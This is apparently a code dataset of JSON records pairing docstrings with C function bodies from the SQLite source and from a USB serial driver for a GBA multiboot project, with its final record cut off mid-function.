{"docstring": "/*\n** group_concat(EXPR, ?SEPARATOR?)\n*/\n", "func_signal": "static void groupConcatStep(\n  sqlite3_context *context,\n  int argc,\n  sqlite3_value **argv\n)", "code": "{\n  const char *zVal;\n  StrAccum *pAccum;\n  const char *zSep;\n  int nVal, nSep;\n  assert( argc==1 || argc==2 );\n  if( sqlite3_value_type(argv[0])==SQLITE_NULL ) return;\n  pAccum = (StrAccum*)sqlite3_aggregate_context(context, sizeof(*pAccum));\n\n  if( pAccum ){\n    sqlite3 *db = sqlite3_context_db_handle(context);\n    int firstTerm = pAccum->useMalloc==0;\n    pAccum->useMalloc = 2;\n    pAccum->mxAlloc = db->aLimit[SQLITE_LIMIT_LENGTH];\n    if( !firstTerm ){\n      if( argc==2 ){\n        zSep = (char*)sqlite3_value_text(argv[1]);\n        nSep = sqlite3_value_bytes(argv[1]);\n      }else{\n        zSep = \",\";\n        nSep = 1;\n      }\n      sqlite3StrAccumAppend(pAccum, zSep, nSep);\n    }\n    zVal = (char*)sqlite3_value_text(argv[0]);\n    nVal = sqlite3_value_bytes(argv[0]);\n    sqlite3StrAccumAppend(pAccum, zVal, nVal);\n  }\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** The replace() function.  Three arguments are all strings: call\n** them A, B, and C. The result is also a string which is derived\n** from A by replacing every occurance of B with C.  The match\n** must be exact.  Collating sequences are not used.\n*/\n", "func_signal": "static void replaceFunc(\n  sqlite3_context *context,\n  int argc,\n  sqlite3_value **argv\n)", "code": "{\n  const unsigned char *zStr;        /* The input string A */\n  const unsigned char *zPattern;    /* The pattern string B */\n  const unsigned char *zRep;        /* The replacement string C */\n  unsigned char *zOut;              /* The output */\n  int nStr;                /* Size of zStr */\n  int nPattern;            /* Size of zPattern */\n  int nRep;                /* Size of zRep */\n  i64 nOut;                /* Maximum size of zOut */\n  int loopLimit;           /* Last zStr[] that might match zPattern[] */\n  int i, j;                /* Loop counters */\n\n  assert( argc==3 );\n  UNUSED_PARAMETER(argc);\n  zStr = sqlite3_value_text(argv[0]);\n  if( zStr==0 ) return;\n  nStr = sqlite3_value_bytes(argv[0]);\n  assert( zStr==sqlite3_value_text(argv[0]) );  /* No encoding change */\n  zPattern = sqlite3_value_text(argv[1]);\n  if( zPattern==0 ){\n    assert( sqlite3_value_type(argv[1])==SQLITE_NULL\n            || sqlite3_context_db_handle(context)->mallocFailed );\n    return;\n  }\n  if( zPattern[0]==0 ){\n    assert( sqlite3_value_type(argv[1])!=SQLITE_NULL );\n    sqlite3_result_value(context, argv[0]);\n    return;\n  }\n  nPattern = sqlite3_value_bytes(argv[1]);\n  assert( zPattern==sqlite3_value_text(argv[1]) );  /* No encoding change */\n  zRep = sqlite3_value_text(argv[2]);\n  if( zRep==0 ) return;\n  nRep = sqlite3_value_bytes(argv[2]);\n  assert( zRep==sqlite3_value_text(argv[2]) );\n  nOut = nStr + 1;\n  assert( nOut<SQLITE_MAX_LENGTH );\n  zOut = contextMalloc(context, (i64)nOut);\n  if( zOut==0 ){\n    return;\n  }\n  loopLimit = nStr - nPattern;  \n  for(i=j=0; i<=loopLimit; i++){\n    if( zStr[i]!=zPattern[0] || memcmp(&zStr[i], zPattern, nPattern) ){\n      zOut[j++] = zStr[i];\n    }else{\n      u8 *zOld;\n      sqlite3 *db = sqlite3_context_db_handle(context);\n      nOut += nRep - nPattern;\n      testcase( nOut-1==db->aLimit[SQLITE_LIMIT_LENGTH] );\n      testcase( nOut-2==db->aLimit[SQLITE_LIMIT_LENGTH] );\n      if( nOut-1>db->aLimit[SQLITE_LIMIT_LENGTH] ){\n        sqlite3_result_error_toobig(context);\n        sqlite3_free(zOut);\n        return;\n      }\n      zOld = zOut;\n      zOut = sqlite3_realloc(zOut, (int)nOut);\n      if( zOut==0 ){\n        sqlite3_result_error_nomem(context);\n        sqlite3_free(zOld);\n        return;\n      }\n      memcpy(&zOut[j], zRep, nRep);\n      j += nRep;\n      i += nPattern-1;\n    }\n  }\n  assert( j+nStr-i+1==nOut );\n  memcpy(&zOut[j], &zStr[i], nStr-i);\n  j += nStr - i;\n  assert( j<=nOut );\n  zOut[j] = 0;\n  sqlite3_result_text(context, (char*)zOut, j, sqlite3_free);\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Interpret the given string as an auto-vacuum mode value.\n**\n** The following strings, \"none\", \"full\" and \"incremental\" are \n** acceptable, as are their numeric equivalents: 0, 1 and 2 respectively.\n*/\n", "func_signal": "static int getAutoVacuum(const char *z)", "code": "{\n  int i;\n  if( 0==sqlite3StrICmp(z, \"none\") ) return BTREE_AUTOVACUUM_NONE;\n  if( 0==sqlite3StrICmp(z, \"full\") ) return BTREE_AUTOVACUUM_FULL;\n  if( 0==sqlite3StrICmp(z, \"incremental\") ) return BTREE_AUTOVACUUM_INCR;\n  i = sqlite3Atoi(z);\n  return (u8)((i>=0&&i<=2)?i:0);\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** An SQL user-function registered to do the work of an ATTACH statement. The\n** three arguments to the function come directly from an attach statement:\n**\n**     ATTACH DATABASE x AS y KEY z\n**\n**     SELECT sqlite_attach(x, y, z)\n**\n** If the optional \"KEY z\" syntax is omitted, an SQL NULL is passed as the\n** third argument.\n*/\n", "func_signal": "static void attachFunc(\n  sqlite3_context *context,\n  int NotUsed,\n  sqlite3_value **argv\n)", "code": "{\n  int i;\n  int rc = 0;\n  sqlite3 *db = sqlite3_context_db_handle(context);\n  const char *zName;\n  const char *zFile;\n  char *zPath = 0;\n  char *zErr = 0;\n  unsigned int flags;\n  Db *aNew;\n  char *zErrDyn = 0;\n  sqlite3_vfs *pVfs;\n\n  UNUSED_PARAMETER(NotUsed);\n\n  zFile = (const char *)sqlite3_value_text(argv[0]);\n  zName = (const char *)sqlite3_value_text(argv[1]);\n  if( zFile==0 ) zFile = \"\";\n  if( zName==0 ) zName = \"\";\n\n  /* Check for the following errors:\n  **\n  **     * Too many attached databases,\n  **     * Transaction currently open\n  **     * Specified database name already being used.\n  */\n  if( db->nDb>=db->aLimit[SQLITE_LIMIT_ATTACHED]+2 ){\n    zErrDyn = sqlite3MPrintf(db, \"too many attached databases - max %d\", \n      db->aLimit[SQLITE_LIMIT_ATTACHED]\n    );\n    goto attach_error;\n  }\n  if( !db->autoCommit ){\n    zErrDyn = sqlite3MPrintf(db, \"cannot ATTACH database within transaction\");\n    goto attach_error;\n  }\n  for(i=0; i<db->nDb; i++){\n    char *z = db->aDb[i].zName;\n    assert( z && zName );\n    if( sqlite3StrICmp(z, zName)==0 ){\n      zErrDyn = sqlite3MPrintf(db, \"database %s is already in use\", zName);\n      goto attach_error;\n    }\n  }\n\n  /* Allocate the new entry in the db->aDb[] array and initialise the schema\n  ** hash tables.\n  */\n  if( db->aDb==db->aDbStatic ){\n    aNew = sqlite3DbMallocRaw(db, sizeof(db->aDb[0])*3 );\n    if( aNew==0 ) return;\n    memcpy(aNew, db->aDb, sizeof(db->aDb[0])*2);\n  }else{\n    aNew = sqlite3DbRealloc(db, db->aDb, sizeof(db->aDb[0])*(db->nDb+1) );\n    if( aNew==0 ) return;\n  }\n  db->aDb = aNew;\n  aNew = &db->aDb[db->nDb];\n  memset(aNew, 0, sizeof(*aNew));\n\n  /* Open the database file. If the btree is successfully opened, use\n  ** it to obtain the database schema. At this point the schema may\n  ** or may not be initialised.\n  */\n  flags = db->openFlags;\n  rc = sqlite3ParseUri(db->pVfs->zName, zFile, &flags, &pVfs, &zPath, &zErr);\n  if( rc!=SQLITE_OK ){\n    if( rc==SQLITE_NOMEM ) db->mallocFailed = 1;\n    sqlite3_result_error(context, zErr, -1);\n    sqlite3_free(zErr);\n    return;\n  }\n  assert( pVfs );\n  flags |= SQLITE_OPEN_MAIN_DB;\n  rc = sqlite3BtreeOpen(pVfs, zPath, db, &aNew->pBt, 0, flags);\n  sqlite3_free( zPath );\n  db->nDb++;\n  if( rc==SQLITE_CONSTRAINT ){\n    rc = SQLITE_ERROR;\n    zErrDyn = sqlite3MPrintf(db, \"database is already attached\");\n  }else if( rc==SQLITE_OK ){\n    Pager *pPager;\n    aNew->pSchema = sqlite3SchemaGet(db, aNew->pBt);\n    if( !aNew->pSchema ){\n      rc = SQLITE_NOMEM;\n    }else if( aNew->pSchema->file_format && aNew->pSchema->enc!=ENC(db) ){\n      zErrDyn = sqlite3MPrintf(db, \n        \"attached databases must use the same text encoding as main database\");\n      rc = SQLITE_ERROR;\n    }\n    pPager = sqlite3BtreePager(aNew->pBt);\n    sqlite3PagerLockingMode(pPager, db->dfltLockMode);\n    sqlite3BtreeSecureDelete(aNew->pBt,\n                             sqlite3BtreeSecureDelete(db->aDb[0].pBt,-1) );\n  }\n  aNew->safety_level = 3;\n  aNew->zName = sqlite3DbStrDup(db, zName);\n  if( rc==SQLITE_OK && aNew->zName==0 ){\n    rc = SQLITE_NOMEM;\n  }\n\n\n#ifdef SQLITE_HAS_CODEC\n  if( rc==SQLITE_OK ){\n    extern int sqlite3CodecAttach(sqlite3*, int, const void*, int);\n    extern void sqlite3CodecGetKey(sqlite3*, int, void**, int*);\n    int nKey;\n    char *zKey;\n    int t = sqlite3_value_type(argv[2]);\n    switch( t ){\n      case SQLITE_INTEGER:\n      case SQLITE_FLOAT:\n        zErrDyn = sqlite3DbStrDup(db, \"Invalid key value\");\n        rc = SQLITE_ERROR;\n        break;\n        \n      case SQLITE_TEXT:\n      case SQLITE_BLOB:\n        nKey = sqlite3_value_bytes(argv[2]);\n        zKey = (char *)sqlite3_value_blob(argv[2]);\n        rc = sqlite3CodecAttach(db, db->nDb-1, zKey, nKey);\n        break;\n\n      case SQLITE_NULL:\n        /* No key specified.  Use the key from the main database */\n        sqlite3CodecGetKey(db, 0, (void**)&zKey, &nKey);\n        if( nKey>0 || sqlite3BtreeGetReserve(db->aDb[0].pBt)>0 ){\n          rc = sqlite3CodecAttach(db, db->nDb-1, zKey, nKey);\n        }\n        break;\n    }\n  }\n#endif\n\n  /* If the file was opened successfully, read the schema for the new database.\n  ** If this fails, or if opening the file failed, then close the file and \n  ** remove the entry from the db->aDb[] array. i.e. put everything back the way\n  ** we found it.\n  */\n  if( rc==SQLITE_OK ){\n    sqlite3BtreeEnterAll(db);\n    rc = sqlite3Init(db, &zErrDyn);\n    sqlite3BtreeLeaveAll(db);\n  }\n  if( rc ){\n    int iDb = db->nDb - 1;\n    assert( iDb>=2 );\n    if( db->aDb[iDb].pBt ){\n      sqlite3BtreeClose(db->aDb[iDb].pBt);\n      db->aDb[iDb].pBt = 0;\n      db->aDb[iDb].pSchema = 0;\n    }\n    sqlite3ResetInternalSchema(db, -1);\n    db->nDb = iDb;\n    if( rc==SQLITE_NOMEM || rc==SQLITE_IOERR_NOMEM ){\n      db->mallocFailed = 1;\n      sqlite3DbFree(db, zErrDyn);\n      zErrDyn = sqlite3MPrintf(db, \"out of memory\");\n    }else if( zErrDyn==0 ){\n      zErrDyn = sqlite3MPrintf(db, \"unable to open database: %s\", zFile);\n    }\n    goto attach_error;\n  }\n  \n  return;\n\nattach_error:\n  /* Return an error if we get here */\n  if( zErrDyn ){\n    sqlite3_result_error(context, zErrDyn, -1);\n    sqlite3DbFree(db, zErrDyn);\n  }\n  if( rc ) sqlite3_result_error_code(context, rc);\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** This function is used to resize the hash table used by the cache passed\n** as the first argument.\n**\n** The PCache mutex must be held when this function is called.\n*/\n", "func_signal": "static int pcache1ResizeHash(PCache1 *p)", "code": "{\n  PgHdr1 **apNew;\n  unsigned int nNew;\n  unsigned int i;\n\n  assert( sqlite3_mutex_held(p->pGroup->mutex) );\n\n  nNew = p->nHash*2;\n  if( nNew<256 ){\n    nNew = 256;\n  }\n\n  pcache1LeaveMutex(p->pGroup);\n  if( p->nHash ){ sqlite3BeginBenignMalloc(); }\n  apNew = (PgHdr1 **)sqlite3_malloc(sizeof(PgHdr1 *)*nNew);\n  if( p->nHash ){ sqlite3EndBenignMalloc(); }\n  pcache1EnterMutex(p->pGroup);\n  if( apNew ){\n    memset(apNew, 0, sizeof(PgHdr1 *)*nNew);\n    for(i=0; i<p->nHash; i++){\n      PgHdr1 *pPage;\n      PgHdr1 *pNext = p->apHash[i];\n      while( (pPage = pNext)!=0 ){\n        unsigned int h = pPage->iKey % nNew;\n        pNext = pPage->pNext;\n        pPage->pNext = apNew[h];\n        apNew[h] = pPage;\n      }\n    }\n    sqlite3_free(p->apHash);\n    p->apHash = apNew;\n    p->nHash = nNew;\n  }\n\n  return (p->apHash ? SQLITE_OK : SQLITE_NOMEM);\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Pop an authorization context that was previously pushed\n** by sqlite3AuthContextPush\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3AuthContextPop(AuthContext *pContext)", "code": "{\n  if( pContext->pParse ){\n    pContext->pParse->zAuthContext = pContext->zAuthContext;\n    pContext->pParse = 0;\n  }\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Lower the locking level on file descriptor pFile to eFileLock.  eFileLock\n** must be either NO_LOCK or SHARED_LOCK.\n**\n** If the locking level of the file descriptor is already at or below\n** the requested locking level, this routine is a no-op.\n*/\n", "func_signal": "static int semUnlock(sqlite3_file *id, int eFileLock)", "code": "{\n  unixFile *pFile = (unixFile*)id;\n  sem_t *pSem = pFile->pInode->pSem;\n\n  assert( pFile );\n  assert( pSem );\n  OSTRACE((\"UNLOCK  %d %d was %d pid=%d (sem)\\n\", pFile->h, eFileLock,\n\t   pFile->eFileLock, getpid()));\n  assert( eFileLock<=SHARED_LOCK );\n  \n  /* no-op if possible */\n  if( pFile->eFileLock==eFileLock ){\n    return SQLITE_OK;\n  }\n  \n  /* shared can just be set because we always have an exclusive */\n  if (eFileLock==SHARED_LOCK) {\n    pFile->eFileLock = eFileLock;\n    return SQLITE_OK;\n  }\n  \n  /* no, really unlock. */\n  if ( sem_post(pSem)==-1 ) {\n    int rc, tErrno = errno;\n    rc = sqliteErrorFromPosixError(tErrno, SQLITE_IOERR_UNLOCK);\n    if( IS_LOCK_ERROR(rc) ){\n      pFile->lastErrno = tErrno;\n    }\n    return rc; \n  }\n  pFile->eFileLock = NO_LOCK;\n  return SQLITE_OK;\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** The string z[] is an text representation of a real number.\n** Convert this string to a double and write it into *pResult.\n**\n** The string z[] is length bytes in length (bytes, not characters) and\n** uses the encoding enc.  The string is not necessarily zero-terminated.\n**\n** Return TRUE if the result is a valid real number (or integer) and FALSE\n** if the string is empty or contains extraneous text.  Valid numbers\n** are in one of these formats:\n**\n**    [+-]digits[E[+-]digits]\n**    [+-]digits.[digits][E[+-]digits]\n**    [+-].digits[E[+-]digits]\n**\n** Leading and trailing whitespace is ignored for the purpose of determining\n** validity.\n**\n** If some prefix of the input string is a valid number, this routine\n** returns FALSE but it still converts the prefix and writes the result\n** into *pResult.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3AtoF(const char *z, double *pResult, int length, u8 enc)", "code": "{\n#ifndef SQLITE_OMIT_FLOATING_POINT\n  int incr = (enc==SQLITE_UTF8?1:2);\n  const char *zEnd = z + length;\n  /* sign * significand * (10 ^ (esign * exponent)) */\n  int sign = 1;    /* sign of significand */\n  i64 s = 0;       /* significand */\n  int d = 0;       /* adjust exponent for shifting decimal point */\n  int esign = 1;   /* sign of exponent */\n  int e = 0;       /* exponent */\n  int eValid = 1;  /* True exponent is either not used or is well-formed */\n  double result;\n  int nDigits = 0;\n\n  *pResult = 0.0;   /* Default return value, in case of an error */\n\n  if( enc==SQLITE_UTF16BE ) z++;\n\n  /* skip leading spaces */\n  while( z<zEnd && sqlite3Isspace(*z) ) z+=incr;\n  if( z>=zEnd ) return 0;\n\n  /* get sign of significand */\n  if( *z=='-' ){\n    sign = -1;\n    z+=incr;\n  }else if( *z=='+' ){\n    z+=incr;\n  }\n\n  /* skip leading zeroes */\n  while( z<zEnd && z[0]=='0' ) z+=incr, nDigits++;\n\n  /* copy max significant digits to significand */\n  while( z<zEnd && sqlite3Isdigit(*z) && s<((LARGEST_INT64-9)/10) ){\n    s = s*10 + (*z - '0');\n    z+=incr, nDigits++;\n  }\n\n  /* skip non-significant significand digits\n  ** (increase exponent by d to shift decimal left) */\n  while( z<zEnd && sqlite3Isdigit(*z) ) z+=incr, nDigits++, d++;\n  if( z>=zEnd ) goto do_atof_calc;\n\n  /* if decimal point is present */\n  if( *z=='.' ){\n    z+=incr;\n    /* copy digits from after decimal to significand\n    ** (decrease exponent by d to shift decimal right) */\n    while( z<zEnd && sqlite3Isdigit(*z) && s<((LARGEST_INT64-9)/10) ){\n      s = s*10 + (*z - '0');\n      z+=incr, nDigits++, d--;\n    }\n    /* skip non-significant digits */\n    while( z<zEnd && sqlite3Isdigit(*z) ) z+=incr, nDigits++;\n  }\n  if( z>=zEnd ) goto do_atof_calc;\n\n  /* if exponent is present */\n  if( *z=='e' || *z=='E' ){\n    z+=incr;\n    eValid = 0;\n    if( z>=zEnd ) goto do_atof_calc;\n    /* get sign of exponent */\n    if( *z=='-' ){\n      esign = -1;\n      z+=incr;\n    }else if( *z=='+' ){\n      z+=incr;\n    }\n    /* copy digits to exponent */\n    while( z<zEnd && sqlite3Isdigit(*z) ){\n      e = e<10000 ? (e*10 + (*z - '0')) : 10000;\n      z+=incr;\n      eValid = 1;\n    }\n  }\n\n  /* skip trailing spaces */\n  if( nDigits && eValid ){\n    while( z<zEnd && sqlite3Isspace(*z) ) z+=incr;\n  }\n\ndo_atof_calc:\n  /* adjust exponent by d, and update sign */\n  e = (e*esign) + d;\n  if( e<0 ) {\n    esign = -1;\n    e *= -1;\n  } else {\n    esign = 1;\n  }\n\n  /* if 0 significand */\n  if( !s ) {\n    /* In the IEEE 754 standard, zero is signed.\n    ** Add the sign if we've seen at least one digit */\n    result = (sign<0 && nDigits) ? -(double)0 : (double)0;\n  } else {\n    /* attempt to reduce exponent */\n    if( esign>0 ){\n      while( s<(LARGEST_INT64/10) && e>0 ) e--,s*=10;\n    }else{\n      while( !(s%10) && e>0 ) e--,s/=10;\n    }\n\n    /* adjust the sign of significand */\n    s = sign<0 ? -s : s;\n\n    /* if exponent, scale significand as appropriate\n    ** and store in result. */\n    if( e ){\n      double scale = 1.0;\n      /* attempt to handle extremely small/large numbers better */\n      if( e>307 && e<342 ){\n        while( e%308 ) { scale *= 1.0e+1; e -= 1; }\n        if( esign<0 ){\n          result = s / scale;\n          result /= 1.0e+308;\n        }else{\n          result = s * scale;\n          result *= 1.0e+308;\n        }\n      }else if( e>=342 ){\n        if( esign<0 ){\n          result = 0.0*s;\n        }else{\n          result = 1e308*1e308*s;  /* Infinity */\n        }\n      }else{\n        /* 1.0e+22 is the largest power of 10 than can be \n        ** represented exactly. */\n        while( e%22 ) { scale *= 1.0e+1; e -= 1; }\n        while( e>0 ) { scale *= 1.0e+22; e -= 22; }\n        if( esign<0 ){\n          result = s / scale;\n        }else{\n          result = s * scale;\n        }\n      }\n    } else {\n      result = (double)s;\n    }\n  }\n\n  /* store the result */\n  *pResult = result;\n\n  /* return true if number and no extra non-whitespace chracters after */\n  return z>=zEnd && nDigits>0 && eValid;\n#else\n  return !sqlite3Atoi64(z, pResult, length, enc);\n#endif /* SQLITE_OMIT_FLOATING_POINT */\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Pop the parser's stack once.\n**\n** If there is a destructor routine associated with the token which\n** is popped from the stack, then call it.\n**\n** Return the major token number for the symbol popped.\n*/\n", "func_signal": "static int yy_pop_parser_stack(yyParser *pParser)", "code": "{\n  YYCODETYPE yymajor;\n  yyStackEntry *yytos = &pParser->yystack[pParser->yyidx];\n\n  /* There is no mechanism by which the parser stack can be popped below\n  ** empty in SQLite.  */\n  if( NEVER(pParser->yyidx<0) ) return 0;\n#ifndef NDEBUG\n  if( yyTraceFILE && pParser->yyidx>=0 ){\n    fprintf(yyTraceFILE,\"%sPopping %s\\n\",\n      yyTracePrompt,\n      yyTokenName[yytos->major]);\n  }\n#endif\n  yymajor = yytos->major;\n  yy_destructor(pParser, yymajor, &yytos->minor);\n  pParser->yyidx--;\n  return yymajor;\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Step the cursor to the back to the previous entry in the database.  If\n** successful then set *pRes=0.  If the cursor\n** was already pointing to the first entry in the database before\n** this routine was called, then set *pRes=1.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreePrevious(BtCursor *pCur, int *pRes)", "code": "{\n  int rc;\n  MemPage *pPage;\n\n  assert( cursorHoldsMutex(pCur) );\n  rc = restoreCursorPosition(pCur);\n  if( rc!=SQLITE_OK ){\n    return rc;\n  }\n  pCur->atLast = 0;\n  if( CURSOR_INVALID==pCur->eState ){\n    *pRes = 1;\n    return SQLITE_OK;\n  }\n  if( pCur->skipNext<0 ){\n    pCur->skipNext = 0;\n    *pRes = 0;\n    return SQLITE_OK;\n  }\n  pCur->skipNext = 0;\n\n  pPage = pCur->apPage[pCur->iPage];\n  assert( pPage->isInit );\n  if( !pPage->leaf ){\n    int idx = pCur->aiIdx[pCur->iPage];\n    rc = moveToChild(pCur, get4byte(findCell(pPage, idx)));\n    if( rc ){\n      return rc;\n    }\n    rc = moveToRightmost(pCur);\n  }else{\n    while( pCur->aiIdx[pCur->iPage]==0 ){\n      if( pCur->iPage==0 ){\n        pCur->eState = CURSOR_INVALID;\n        *pRes = 1;\n        return SQLITE_OK;\n      }\n      moveToParent(pCur);\n    }\n    pCur->info.nSize = 0;\n    pCur->validNKey = 0;\n\n    pCur->aiIdx[pCur->iPage]--;\n    pPage = pCur->apPage[pCur->iPage];\n    if( pPage->intKey && !pPage->leaf ){\n      rc = sqlite3BtreePrevious(pCur, pRes);\n    }else{\n      rc = SQLITE_OK;\n    }\n  }\n  *pRes = 0;\n  return rc;\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Return a pointer to a buffer containing a text representation of the\n** expression passed as the first argument. The buffer is obtained from\n** sqlite3_malloc(). It is the responsibility of the caller to use \n** sqlite3_free() to release the memory. If an OOM condition is encountered,\n** NULL is returned.\n**\n** If the second argument is not NULL, then its contents are prepended to \n** the returned expression text and then freed using sqlite3_free().\n*/\n", "func_signal": "static char *exprToString(Fts3Expr *pExpr, char *zBuf)", "code": "{\n  switch( pExpr->eType ){\n    case FTSQUERY_PHRASE: {\n      Fts3Phrase *pPhrase = pExpr->pPhrase;\n      int i;\n      zBuf = sqlite3_mprintf(\n          \"%zPHRASE %d 0\", zBuf, pPhrase->iColumn);\n      for(i=0; zBuf && i<pPhrase->nToken; i++){\n        zBuf = sqlite3_mprintf(\"%z %.*s%s\", zBuf, \n            pPhrase->aToken[i].n, pPhrase->aToken[i].z,\n            (pPhrase->aToken[i].isPrefix?\"+\":\"\")\n        );\n      }\n      return zBuf;\n    }\n\n    case FTSQUERY_NEAR:\n      zBuf = sqlite3_mprintf(\"%zNEAR/%d \", zBuf, pExpr->nNear);\n      break;\n    case FTSQUERY_NOT:\n      zBuf = sqlite3_mprintf(\"%zNOT \", zBuf);\n      break;\n    case FTSQUERY_AND:\n      zBuf = sqlite3_mprintf(\"%zAND \", zBuf);\n      break;\n    case FTSQUERY_OR:\n      zBuf = sqlite3_mprintf(\"%zOR \", zBuf);\n      break;\n  }\n\n  if( zBuf ) zBuf = sqlite3_mprintf(\"%z{\", zBuf);\n  if( zBuf ) zBuf = exprToString(pExpr->pLeft, zBuf);\n  if( zBuf ) zBuf = sqlite3_mprintf(\"%z} {\", zBuf);\n\n  if( zBuf ) zBuf = exprToString(pExpr->pRight, zBuf);\n  if( zBuf ) zBuf = sqlite3_mprintf(\"%z}\", zBuf);\n\n  return zBuf;\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Compute the number of pages of cache requested.\n*/\n", "func_signal": "static int numberOfCachePages(PCache *p)", "code": "{\n  if( p->szCache>=0 ){\n    return p->szCache;\n  }else{\n    return (int)((-1024*(i64)p->szCache)/(p->szPage+p->szExtra));\n  }\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "/*\n** Set the Expr.nHeight variable using the exprSetHeight() function. If\n** the height is greater than the maximum allowed expression depth,\n** leave an error in pParse.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3ExprSetHeight(Parse *pParse, Expr *p)", "code": "{\n  exprSetHeight(p);\n  sqlite3ExprCheckHeight(pParse, p->nHeight);\n}", "path": "include\\sqlite\\sqlite3.c", "repo_name": "markshiz/cross-platform-tutorial", "stars": 37, "license": "None", "language": "c", "size": 2031}
{"docstring": "// get the next character, or -1 if nothing received\n", "func_signal": "int16_t usb_serial_getchar(void)", "code": "{\n\tuint8_t c, intr_state;\n\n\t// interrupts are disabled so these functions can be\n\t// used from the main program or interrupt context,\n\t// even both in the same program!\n\tintr_state = SREG;\n\tcli();\n\tif (!usb_configuration) {\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\tUENUM = CDC_RX_ENDPOINT;\n\tretry:\n\tc = UEINTX;\n\tif (!(c & (1<<RWAL))) {\n\t\t// no data in buffer\n\t\tif (c & (1<<RXOUTI)) {\n\t\t\tUEINTX = 0x6B;\n\t\t\tgoto retry;\n\t\t}\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\t// take one byte out of the buffer\n\tc = UEDATX;\n\t// if buffer completely used, release it\n\tif (!(UEINTX & (1<<RWAL))) UEINTX = 0x6B;\n\tSREG = intr_state;\n\treturn c;\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// discard any buffered input\n", "func_signal": "void usb_serial_flush_input(void)", "code": "{\n\tuint8_t intr_state;\n\n\tif (usb_configuration) {\n\t\tintr_state = SREG;\n\t\tcli();\n\t\tUENUM = CDC_RX_ENDPOINT;\n\t\twhile ((UEINTX & (1<<RWAL))) {\n\t\t\tUEINTX = 0x6B;\n\t\t}\n\t\tSREG = intr_state;\n\t}\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// number of bytes available in the receive buffer\n", "func_signal": "uint8_t usb_serial_available(void)", "code": "{\n\tuint8_t n=0, i, intr_state;\n\n\tintr_state = SREG;\n\tcli();\n\tif (usb_configuration) {\n\t\tUENUM = CDC_RX_ENDPOINT;\n\t\tn = UEBCLX;\n\t\tif (!n) {\n\t\t\ti = UEINTX;\n\t\t\tif (i & (1<<RXOUTI) && !(i & (1<<RWAL))) UEINTX = 0x6B;\n\t\t}\n\t}\n\tSREG = intr_state;\n\treturn n;\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// transmit a buffer.\n//  0 returned on success, -1 on error\n// This function is optimized for speed!  Each call takes approx 6.1 us overhead\n// plus 0.25 us per byte.  12 Mbit/sec USB has 8.67 us per-packet overhead and\n// takes 0.67 us per byte.  If called with 64 byte packet-size blocks, this function\n// can transmit at full USB speed using 43% CPU time.  The maximum theoretical speed\n// is 19 packets per USB frame, or 1216 kbytes/sec.  However, bulk endpoints have the\n// lowest priority, so any other USB devices will likely reduce the speed.  Speed\n// can also be limited by how quickly the PC-based software reads data, as the host\n// controller in the PC will not allocate bandwitdh without a pending read request.\n// (thanks to Victor Suarez for testing and feedback and initial code)\n", "func_signal": "int8_t usb_serial_write(const uint8_t *buffer, uint16_t size)", "code": "{\n\tuint8_t timeout, intr_state, write_size;\n\n\t// if we're not online (enumerated and configured), error\n\tif (!usb_configuration) return -1;\n\t// interrupts are disabled so these functions can be\n\t// used from the main program or interrupt context,\n\t// even both in the same program!\n\tintr_state = SREG;\n\tcli();\n\tUENUM = CDC_TX_ENDPOINT;\n\t// if we gave up due to timeout before, don't wait again\n\tif (transmit_previous_timeout) {\n\t\tif (!(UEINTX & (1<<RWAL))) {\n\t\t\tSREG = intr_state;\n\t\t\treturn -1;\n\t\t}\n\t\ttransmit_previous_timeout = 0;\n\t}\n\t// each iteration of this loop transmits a packet\n\twhile (size) {\n\t\t// wait for the FIFO to be ready to accept data\n\t\ttimeout = UDFNUML + TRANSMIT_TIMEOUT;\n\t\twhile (1) {\n\t\t\t// are we ready to transmit?\n\t\t\tif (UEINTX & (1<<RWAL)) break;\n\t\t\tSREG = 